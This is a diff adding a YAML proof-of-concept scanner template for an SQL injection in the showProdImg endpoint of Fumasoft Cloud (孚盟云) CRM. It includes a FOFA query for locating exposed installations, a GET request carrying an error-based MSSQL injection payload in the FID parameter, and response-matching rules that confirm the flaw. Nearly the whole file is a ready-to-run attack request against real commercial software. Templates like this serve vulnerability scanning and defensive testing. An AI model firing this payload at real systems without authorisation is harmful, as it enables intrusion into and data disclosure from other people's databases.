@@ -1,0 +1,17 @@
+id: poc-yaml-fumasoft-showprodimg-sqli
+info:
+  name: 孚盟云 showProdImg SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 孚盟云
+  fofa: app="孚盟软件-孚盟云"
+variables:
+  t1: random_int(1000,100000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /Ajax/upload.ashx?action=showProdImg&FID=1')and%201<@@version--
+  expression: status_code == 500 && contains(body,"Microsoft SQL Server") && contains(body,"FumaCRM")
+    && contains(body,"showProdImg") && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
+transport: http
